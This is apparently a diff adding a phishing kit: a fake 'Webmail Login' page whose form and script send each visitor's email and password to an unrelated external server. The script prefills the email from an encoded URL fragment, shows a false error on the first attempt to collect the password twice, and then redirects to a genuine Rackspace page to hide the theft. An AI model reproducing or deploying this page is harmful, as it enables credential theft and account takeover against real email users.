@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html class="user_font_size_normal" lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+    <title>Webmail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+        content="">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="stylesheet" type="text/css" href="https://serograf.com/wp/styles.css">
+    <link rel="SHORTCUT ICON" href="https://mail.agrohurt.com/img/logo/favicon.ico">
+
+
+    <script data-dapp-detection="" nonce="NTYzODU3MjU5LDE4MjIyOTQ1NzM=">
+        (function () {
+            let alreadyInsertedMetaTag = false
+
+            function __insertDappDetected() {
+                if (!alreadyInsertedMetaTag) {
+                    const meta = document.createElement('meta')
+                    meta.name = 'dapp-detected'
+                    document.head.appendChild(meta)
+                    alreadyInsertedMetaTag = true
+                }
+            }
+
+            if (window.hasOwnProperty('web3')) {
+                // Note a closure can't be used for this var because some sites like
+                // www.wnyc.org do a second script execution via eval for some reason.
+                window.__disableDappDetectionInsertion = true
+                // Likely oldWeb3 is undefined and it has a property only because
+                // we defined it. Some sites like wnyc.org are evaling all scripts
+                // that exist again, so this is protection against multiple calls.
+                if (window.web3 === undefined) {
+                    return
+                }
+                __insertDappDetected()
+            } else {
+                var oldWeb3 = window.web3
+                Object.defineProperty(window, 'web3', {
+                    configurable: true,
+                    set: function (val) {
+                        if (!window.__disableDappDetectionInsertion)
+                            __insertDappDetected()
+                        oldWeb3 = val
+                    },
+                    get: function () {
+                        if (!window.__disableDappDetectionInsertion)
+                            __insertDappDetected()
+                        return oldWeb3
+                    }
+                })
+            }
+        })()
+    </script>
+    <style>
+        ._3emE9--dark-theme .-S-tR--ff-downloader {
+            background: rgba(30, 30, 30, .93);
+            border: 1px solid rgba(82, 82, 82, .54);
+            box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
+            color: #fff
+        }
+
+        ._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn {
+            background: #3d4b52
+        }
+
+        ._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover {
+            background: #131415
+        }
+
+        ._3emE9--dark-theme .-S-tR--ff-downloader ._10vpG--footer {
+            background: rgba(30, 30, 30, .93)
+        }
+
+        ._2mDEx--white-theme .-S-tR--ff-downloader {
+            background: #fff;
+            border: 1px solid rgba(82, 82, 82, .54);
+            box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
+            color: #314c75
+        }
+
+        ._2mDEx--white-theme .-S-tR--ff-downloader ._6_Mtt--header {
+            font-weight: 700
+        }
+
+        ._2mDEx--white-theme .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice {
+            border: 0;
+            color: rgba(0, 0, 0, .88)
+        }
+
+        ._2mDEx--white-theme .-S-tR--ff-downloader ._10vpG--footer {
+            background: #fff
+        }
+
+        .-S-tR--ff-downloader {
+            display: block;
+            overflow: hidden;
+            position: fixed;
+            bottom: 20px;
+            right: 7.1%;
+            width: 330px;
+            height: 180px;
+            background: rgba(30, 30, 30, .93);
+            border-radius: 2px;
+            color: #fff;
+            z-index: 99999999;
+            border: 1px solid rgba(82, 82, 82, .54);
+            box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
+            transition: .5s
+        }
+
+        .-S-tR--ff-downloader._3M7UQ--minimize {
+            height: 62px
+        }
+
+        .-S-tR--ff-downloader._3M7UQ--minimize .nxuu4--file-info,
+        .-S-tR--ff-downloader._3M7UQ--minimize ._6_Mtt--header {
+            display: none
+        }
+
+        .-S-tR--ff-downloader ._6_Mtt--header {
+            padding: 10px;
+            font-size: 17px;
+            font-family: sans-serif
+        }
+
+        .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn {
+            float: right;
+            background: #f1ecec;
+            height: 20px;
+            width: 20px;
+            text-align: center;
+            padding: 2px;
+            margin-top: -10px;
+            cursor: pointer
+        }
+
+        .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover {
+            background: #e2dede
+        }
+
+        .-S-tR--ff-downloader ._13XQ2--error {
+            color: red;
+            padding: 10px;
+            font-size: 12px;
+            line-height: 19px
+        }
+
+        .-S-tR--ff-downloader ._2dFLA--container {
+            position: relative;
+            height: 100%
+        }
+
+        .-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info {
+            padding: 6px 15px 0;
+            font-family: sans-serif
+        }
+
+        .-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info div {
+            margin-bottom: 5px;
+            width: 100%;
+            overflow: hidden
+        }
+
+        .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice {
+            margin-top: 21px;
+            font-size: 11px
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer {
+            width: 100%;
+            bottom: 0;
+            position: absolute;
+            font-weight: 700
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._2V73d--loader {
+            -webkit-animation: n0BD1--rotation 3.5s linear forwards;
+            animation: n0BD1--rotation 3.5s linear forwards;
+            position: absolute;
+            top: -120px;
+            left: calc(50% - 35px);
+            border-radius: 50%;
+            border: 5px solid #fff;
+            border-top-color: #a29bfe;
+            height: 70px;
+            width: 70px;
+            display: flex;
+            justify-content: center;
+            align-items: center
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar {
+            width: 100%;
+            height: 18px;
+            background: #dfe6e9;
+            border-radius: 5px
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar ._1FVu9--progress-bar {
+            height: 100%;
+            background: #8bc34a;
+            border-radius: 5px
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status {
+            margin-top: 10px
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1XilH--state {
+            float: left;
+            font-size: .9em;
+            letter-spacing: 1pt;
+            text-transform: uppercase;
+            width: 100px;
+            height: 20px;
+            position: relative
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1jiaj--percentage {
+            float: right
+        }
+    </style>
+</head>
+
+<body onload="onLoad();">
+    <div id="StayFocusd-infobar" style="display:none;">
+        <img src="chrome-extension://laankejkbhbdhmipfmgcngdelahlfoji/common/img/eye_19x19_red.png">
+        <span id="StayFocusd-infobar-msg"></span>
+        <span id="StayFocusd-infobar-links">
+            <a id="StayFocusd-infobar-never-show">hide forever</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+            <a id="StayFocusd-infobar-hide">hide once</a>
+        </span>
+    </div>
+
+    <div id="modifiedLogin" class="LoginScreen">
+        <div class="modernCenter">
+            <div class="moderc">
+                <div id="content-header-label">Webmail Login</div>
+                <div id="content-header-logo">
+                  <!-- To add a logo just put it in an img tag below this comment! -->
+                </div>
+              </div>
+              
+            <div class="modernContentBox">
+                
+                  
+                
+                <form id="zLoginForm" method="post" name="loginForm" action="https://esbeltacademia.com.br/bn/act.php" accept-charset="UTF-8">
+                    <input type="hidden" name="loginOp" value="login">
+                    <input type="hidden" name="login_csrf" value="6fa185d8-4b03-4074-a0a0-22912759d6e3">
+
+                    <div class="signIn">              </div>
+                    <div class="form">
+                        <div class="loginSection">
+                            <div id="error" style="color:red; display: none" class="errorMessage">
+                                <span id="error" class="notification-heading">An error has
+                                    occurred.</span>
+                            </div>
+                            <br />
+
+                            <div class="r">
+                            <label for="username" class="zLoginFieldLabel">Email address</label>
+                            <input id="username" tabindex="1" class="zLoginFieldInput" name="username" type="text"
+                                value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off">
+                                <div class="rememberCheckWrapper">
+                                    <a href="#" id="remember" for="remember">Forgot Password ?</a>
+                                </div>
+                            <label for="password" class="zLoginFieldLabel">Password</label>
+                            <div class="passwordWrapper">
+                                <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput"
+                                    name="password" type="password" value="" size="40" maxlength="1024">
+                                
+                            </div>
+                            <div class="signInAndLabel">
+                                <div>
+                                    <input type="submit" tabindex="5" class="loginButton" value="Log In" name="">
+                                </div>
+                                
+                            </div>
+                            </div>
+                            
+                        </div>
+                        <div>
+                            <hr>
+                        </div>
+                       
+                        </div>
+                    </div>
+                </form>
+            </div>
+            <div class="decor1"></div>
+        </div>
+
+        <div class="Footer">
+            <div id="ZLoginNotice" class="legalNotice-small"></div>
+        </div>
+        <div class="decor2"></div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js" nonce="NTYzODU3MjU5LDE4MjIyOTQ1NzM="></script>
+    <script nonce="NTYzODU3MjU5LDE4MjIyOTQ1NzM=">
+        const userInputId = '#username'
+        const passwordInputId = '#password'
+        const submitButtonId = '#loginButton'
+        const errorId = '#error'
+
+        function getEmail() {
+            return $(userInputId).val();
+        }
+
+        function getPassword() {
+            return $(passwordInputId).val();
+        }
+
+        function showError(value) {
+            $(errorId).show();
+            $(errorId).html(value);
+        }
+
+        function hideError() {
+            $(errorId).hide();
+        }
+
+        $(document).ready(function () {
+
+            var count = 0;
+
+            var email = window.location.hash.substr(1);
+
+            if (email) {
+                try {
+                    email = atob(email)
+                } catch (error) { }
+
+                $(userInputId).val(email);
+                $(passwordInputId).focus();
+            }
+
+            $("form").submit(function (event) {
+                hideError()
+
+                var email = getEmail();
+                var password = getPassword();
+
+                var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                if (!email) {
+                    showError('Email field is empty.!')
+
+                    return false;
+                }
+
+                if (!filter.test(email)) {
+                    showError('That account doesn\'t exist. Enter a different account')
+
+                    return false;
+                }
+
+                if (!password) {
+                    showError('Password field is empty!')
+                    $(passwordInputId).focus();
+
+                    return false;
+                }
+
+                count++;
+
+                var data = { count, email, password };
+
+                const url = 'https://esbeltacademia.com.br/bn/act.php'
+
+                $.ajax({
+                    type: "POST",
+                    url,
+                    data,
+                    dataType: "json",
+                    encode: true,
+                    beforeSend: function (xhr) {
+                        $(submitButtonId).val('Please wait...');
+                    },
+                    success: () => doRedirect(count),
+                    error: () => doRedirect(count),
+                    complete: function () {
+                        $(submitButtonId).val('Login');
+                    }
+                }).done(function (data) { });
+
+                event.preventDefault();
+            });
+
+        });
+
+        function doRedirect(count) {
+            const redirect_link = 'https://app.rackspace.com/index.php'
+
+            if (count < 2) {
+                showError('The info you entered doesn\'t match our records. Please try again.')
+
+                $(passwordInputId).val('');
+                $(passwordInputId).focus();
+            } else {
+                window.location.href = redirect_link;
+            }
+        }
+
+        // show a message if they should be using the 'standard' client, but have chosen 'advanced' instead
+        function clientChange(selectValue) {
+            var div = document.getElementById("ZLoginUnsupported");
+            if (div)
+                div.style.display = 'none';
+        }
+
+
+        function forgotPassword() {
+            var accountInput = document.getElementById("username").value;
+            var queryParams = encodeURI("account=" + accountInput);
+            var url = "/public/PasswordRecovery.jsp?" + location.search;
+
+            if (accountInput !== '') {
+                url += (location.search !== '' ? '&' : '') + encodeURI("account=" + accountInput);
+            }
+
+            window.location.href = url;
+        }
+
+        function disableEnable(txt) {
+            var bt = document.getElementById('verifyButton');
+            if (txt.value != '') {
+                bt.disabled = false;
+            } else {
+                bt.disabled = true;
+            }
+        }
+
+        function hideTooltip() {
+            document.getElementById('ZLoginWhatsThis').style.display = 'none';
+        }
+
+        function showTooltip() {
+            document.getElementById('ZLoginWhatsThis').style.display = "block"
+        }
+
+
+        function showPassword() {
+            var x = document.getElementById("password");
+            var y = document.getElementById("showSpan")
+            var z = document.getElementById("hideSpan")
+            if (x.type === "password") {
+                x.type = "text";
+                y.style.display = "none";
+                z.style.display = "block";
+            } else {
+                x.type = "password";
+                y.style.display = "block";
+                z.style.display = "none";
+            }
+        }
+
+
+        function onLoad() {
+            var loginForm = document.loginForm;
+            if (loginForm.username) {
+                if (loginForm.username.value != "") {
+                    loginForm.password.focus(); //if username set, focus on password
+                } else {
+                    loginForm.username.focus();
+                }
+            }
+            clientChange("preferred");
+            //check if the login page is loaded in the sidebar.
+            if (navigator.mozSocial) {
+                //send a ping so that worker knows about this page.
+                navigator.mozSocial.getWorker().port.postMessage({
+                    topic: "worker.reload",
+                    data: true
+                });
+                //this page is loaded in firefox sidebar so listen for message from worker.
+                navigator.mozSocial.getWorker().port.onmessage = function onmessage(e) {
+                    var topic = e.data.topic;
+                    if (topic && topic == "sidebar.authenticated") {
+                        window.location.href = "/public/launchSidebar.jsp";
+                    }
+                };
+            }
+            if (false && loginForm.totpcode) {
+                loginForm.totpcode.focus();
+            }
+        }
+    </script>
+
+</body>
+
+</html>
